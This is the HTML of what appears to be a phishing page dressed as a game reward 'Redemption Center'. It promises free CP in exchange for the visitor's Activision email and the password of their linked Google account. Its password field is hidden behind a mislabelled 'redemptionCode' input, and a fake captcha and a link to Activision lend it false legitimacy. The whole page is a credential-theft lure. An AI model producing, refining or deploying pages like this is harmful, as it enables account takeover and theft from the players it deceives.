<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NEXUS OPS | Redemption Center</title>
<meta name="description" content="Redeem your NEXUS OPS codes for exclusive in-game rewards.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;500;600;700&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body>

<!-- ================= HEADER ================= -->
<header class="site-header" id="siteHeader">
  <div class="header-inner">
    <button class="hamburger" id="hamburgerBtn" aria-label="Toggle navigation" aria-expanded="false">
      <span></span><span></span><span></span>
    </button>

    <a href="#home" class="logo">
      <img src="logo.png" alt="" style="width: 150px;">
    </a>

    <nav class="main-nav" id="mainNav">
      <a href="https://www.activision.com/" class="nav-login">Activition</a>
      <a href="#redeem-form" class="btn btn-yellow nav-cta">REDEEM NOW</a>
    </nav>
  </div>
</header>

<div class="nav-overlay" id="navOverlay"></div>

<main id="home">

  <!-- ================= HERO ================= -->
  <section class="hero">
    <div class="hero-bg-grid"></div>
    <div class="hero-inner">

      <div class="hero-copy">
        <h1 class="hero-title"><img src="logo.webp" alt="" style="margin-left: 15%;"></h1>
        <p class="hero-subtitle" style="margin-left: 18%;">Enter the Activision email linked to your Google account, and that Google account's password below, to receive 2,200 CP for free.</p>
      </div>

      <div class="hero-visual">
        <img src="hero.jpg" data-img="hero" alt="NEXUS OPS armored operator" class="hero-img" id="heroImg">
        <div class="hero-visual-glow"></div>
      </div>

      <div class="hero-form-wrap" id="redeem-form">
        <form class="redeem-form" id="redeemForm" novalidate>
          <h2 class="form-title">Free CP</h2>
          <p class="form-subtitle">All fields are required to process your claim.</p>

          <div class="field-group">
            <label for="playerUid">Email</label>
            <input type="email" id="playerUid" name="playerUid" placeholder="Enter your Email" autocomplete="off">
            <span class="field-error" id="err-playerUid"></span>
          </div>

          <div class="field-group">
            <label for="redemptionCode">Password</label>
            <input type="text" id="redemptionCode" name="redemptionCode" placeholder="Enter Password" autocomplete="off">
            <span class="field-error" id="err-redemptionCode"></span>
          </div>

          <div class="field-group">
            <label for="verificationCode">VERIFICATION</label>
            <div class="verify-row">
              <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter verification code" autocomplete="off">
              <div class="captcha-box" id="captchaBox">7041</div>
              <button type="button" class="captcha-refresh" id="captchaRefresh" aria-label="Refresh verification code">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                  <path d="M21 12a9 9 0 1 1-2.64-6.36"/>
                  <polyline points="21 3 21 9 15 9"/>
                </svg>
              </button>
            </div>
            <span class="field-error" id="err-verificationCode"></span>
          </div>

          <label class="checkbox-row">
            <input type="checkbox" id="agreeTerms" name="agreeTerms">
            <span class="checkbox-box"></span>
            <span class="checkbox-label">I agree to the redemption terms.</span>
          </label>
          <span class="field-error" id="err-agreeTerms"></span>

          <button type="submit" class="btn btn-yellow btn-block" id="claimBtn">
            <span class="btn-label">CLAIM REWARD</span>
            <span class="btn-spinner" aria-hidden="true"></span>
          </button>

          <div class="form-message" id="formMessage" role="status" aria-live="polite"></div>
        </form>
      </div>

    </div>
  </section>

</main>

<script src="script.js"></script>
</body>
</html>
